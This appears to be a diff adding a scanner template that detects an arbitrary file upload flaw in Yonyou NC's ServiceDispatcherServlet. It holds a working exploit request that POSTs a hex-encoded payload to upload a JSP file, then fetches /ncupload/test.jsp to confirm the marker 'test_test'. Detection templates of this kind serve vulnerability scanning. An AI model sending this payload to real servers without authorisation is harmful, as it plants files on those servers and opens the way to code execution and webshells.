@@ -1,0 +1,38 @@
+id: yonyou-nc-file-upload
+info:
+  name: Yonyou NC ServiceDispatcherServlet File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Yonyou NC is a management software for group enterprises under China Yonyou Group. There is an arbitrary file upload vulnerability in Yonyou NC ServiceDispatcherServlet routing, allowing attackers to upload arbitrary files, execute arbitrary code on the server, and obtain a webshell.
+  tags: code-execution, file-upload
+http:
+  - raw:
+      - |
+        POST /ServiceDispatcherServlet HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/octet-stream
+
+        {{hex_decode("000001547271890390CEA362632F6E8819F73AC2FA807D6C4339EDC09EC33877DA87BA2DFC2DE877878483C37766FAD87B63C2848D9120C873768876781AFE3E28D926ABCB12FC7957D76717FCCBE16C9A34A1B9196A26042E4DFED1333B00496FEB7BAF4F1983E881321E262CD2EF76738F9AEA3342756481046FB078343E8FAD5FDDA1354C4C4BA4734671F9CDFBB0B1C6F980ABDE21D20D7FD7E1E8A165931CB64DD59A04B00A34E0D43A597D2087FA2CE3875F37B0BC578FCF97EBACD26C69052EBDD1CC174657C703A965879E642B6F484D8691B73F4616E48864AF1803F7FB4FDC057BA0AC74C1B08028E261408CC43CA0F90994015BD25C32D77383EBE48986DF180248A82134D6F68E03A16C131A973475989CB146DA3A47C1B00A113C3F46475CD4AD6E653615A7D2B766243C922585FBA061EF916DFE65E081C5722131181CC1799B5979429CFDD1B159AD28C7F9CA307A51C7")}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "test_test"
+  - raw:
+      - |
+        GET /ncupload/test.jsp HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "test_test"
